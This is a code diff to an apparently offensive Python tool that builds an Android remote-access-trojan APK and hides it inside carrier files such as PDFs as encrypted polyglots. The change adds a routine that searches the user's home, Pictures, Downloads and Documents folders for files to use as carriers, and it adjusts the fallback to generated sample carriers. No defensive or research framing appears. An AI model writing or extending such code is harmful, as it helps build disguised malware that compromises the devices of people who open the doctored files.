@@ -121,14 +121,34 @@ def _build_apk(name: str = "agent", spec: str = "rat") -> str:
     return builder.build(config, engine="auto", release=True, out=out)
 
 
+def _resolve_carrier(target: str) -> Optional[str]:
+    """Find a carrier file: absolute path, cwd, or common user folders."""
+    target = target.strip("\"'")
+    if not target:
+        return None
+    if os.path.isabs(target):
+        return target if os.path.isfile(target) else None
+    for base in (os.getcwd(),
+                 os.path.expanduser("~"),
+                 os.path.expanduser("~/Pictures"),
+                 os.path.expanduser("~/Downloads"),
+                 os.path.expanduser("~/Documents"),
+                 os.path.join(store.ROOT, "dist")):
+        candidate = os.path.join(base, target)
+        if os.path.isfile(candidate):
+            return candidate
+    return None
+
+
 def _inject(spec: str, target: str) -> None:
     """inject <spec> <file> — hide the payload inside `target` (or make one)."""
     if spec not in builder.SPECS:
         print(_colored(f"  unknown spec {spec!r} — {', '.join(sorted(builder.SPECS))}", YELLOW))
         return
-    ext = os.path.splitext(target)[1].lower().lstrip(".") or "pdf"
+    target = target.strip("\"'")
+    ext = os.path.splitext(target)[1].lower().lstrip(".")
     if ext not in polyglot.MODES:
-        print(_colored(f"  no carrier recipe for .{ext} — {', '.join(sorted(polyglot.MODES))}", YELLOW))
+        print(_colored(f"  no carrier recipe for .{ext or '?'} — {', '.join(sorted(polyglot.MODES))}", YELLOW))
         return
     apk = _latest_apk()
     if not apk:
@@ -136,11 +156,12 @@ def _inject(spec: str, target: str) -> None:
         apk = _build_apk("agent", spec)
     folder = os.path.join(store.ROOT, "dist", spec)
     os.makedirs(folder, exist_ok=True)
-    if os.path.isfile(target):
-        source = target
+    source = _resolve_carrier(target)
+    if source:
+        print(_colored(f"  carrier    {source}", DIM))
     else:
         source = samples.sample(ext, folder)
-        print(_colored(f"  carrier sample {source}", DIM))
+        print(_colored(f"  carrier sample {source} (target file not found: {target})", DIM))
     result = polyglot.build(source, apk, out_dir=folder, encrypt=True)
     print(_colored(f"  spec      {spec} · modules {', '.join(builder.SPECS[spec]) or '-'}", B_CYAN))
     print(_colored(f"  carrier   {result.carrier}", B_GREEN))
